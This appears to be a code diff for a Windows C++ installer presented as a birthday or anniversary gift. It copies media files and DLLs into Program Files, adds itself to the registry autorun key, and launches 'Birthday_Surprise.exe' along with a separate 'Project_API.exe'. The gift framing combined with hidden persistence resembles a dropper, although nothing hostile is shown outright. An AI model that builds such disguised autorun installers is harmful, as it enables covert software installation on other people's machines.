@@ -25,6 +25,7 @@ bool writeToFile(HANDLE readFile, HANDLE writeFile)
 bool copyFile(LPCWSTR sourceFilePath, LPCWSTR destFilePath)
 {
 	HANDLE hFileDest, hFileSource;
+	wchar_t ownPath[MAX_PATH];
 
 	// creating file at the destination path
 	hFileDest = CreateFile(destFilePath, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
@@ -67,6 +68,7 @@ int main()
 		L"Birthday_Surprise.exe",
 		L"confetti.gif",
 		L"confettisound.mp3",
+		L"birthday.mp3",
 		L"AudioSwitcher.AudioApi.CoreAudio.dll",
 		L"AudioSwitcher.AudioApi.dll",
 		L"WpfAnimatedGif.dll",
@@ -79,6 +81,7 @@ int main()
 		L"C:\\Program Files\\Anniversary Gift\\surprise.exe",
 		L"C:\\Program Files\\Anniversary Gift\\confetti.gif",
 		L"C:\\Program Files\\Anniversary Gift\\confettisound.mp3",
+		L"C:\\Program Files\\Anniversary Gift\\birthday.mp3",
 		L"C:\\Program Files\\Anniversary Gift\\AudioSwitcher.AudioApi.CoreAudio.dll",
 		L"C:\\Program Files\\Anniversary Gift\\AudioSwitcher.AudioApi.dll",
 		L"C:\\Program Files\\Anniversary Gift\\WpfAnimatedGif.dll",
@@ -86,7 +89,6 @@ int main()
 		L"C:\\Program Files\\Anniversary Gift\\WpfAnimatedGif.xml"
 	};
 
-	FreeConsole();
 	hfileAutorun = CreateFile(dictname, READ_CONTROL, NULL, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	if (hfileAutorun == INVALID_HANDLE_VALUE) // first time running the program
 	{
@@ -99,7 +101,7 @@ int main()
 				return 1;
 			}
 		}
-
+		
 		// open regedit autorun
 		if (RegOpenKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &openRun) != ERROR_SUCCESS)
 		{
@@ -117,6 +119,14 @@ int main()
 	}
 
 	CloseHandle(hfileAutorun);
+
+	PROCESS_INFORMATION processInfo;
+	STARTUPINFOA info = { sizeof(info) };
+	CreateProcessA("Birthday_Surprise.exe", (LPSTR)"Birthday_Surprise.exe", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+	CreateProcessA("Project_API.exe", (LPSTR)"Project_API.exe", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+
+	CloseHandle(processInfo.hProcess);
+	CloseHandle(processInfo.hThread);
 
 	return 0;
 }
